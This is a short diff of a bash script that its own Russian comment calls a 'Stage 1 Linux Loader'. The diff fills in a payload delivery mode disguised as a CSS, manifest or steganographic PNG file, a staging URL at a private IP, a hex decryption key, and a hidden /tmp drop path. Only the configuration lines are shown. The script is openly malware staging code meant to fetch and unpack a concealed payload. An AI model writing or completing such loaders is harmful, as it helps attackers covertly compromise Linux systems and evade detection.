@@ -1,9 +1,9 @@
 #!/bin/bash
 # Универсальный Stage 1 Linux Loader для 2025+ (LSB PNG: строго по длине!)
 
-DELIVERY="REPLACE_DELIVERY"          # css, manifest, png (подставляет run.sh)
-URL="REPLACE_URL"                    # http://IP:PORT/style.css или manifest.json или favicon.png
-KEY="REPLACE_KEY"                    # HEX (подставляет run.sh)
+DELIVERY="css"          # css, manifest, png (подставляет run.sh)
+URL="http://192.168.0.11:8080/style.css"                    # http://IP:PORT/style.css или manifest.json или favicon.png
+KEY="1307d25f3ae7d8c1efbf9f770e604db6e86f32062f3efc7d53b7f01373b5868b"                    # HEX (подставляет run.sh)
 TMP=/tmp/.drop$RANDOM$RANDOM
 
 case "$DELIVERY" in
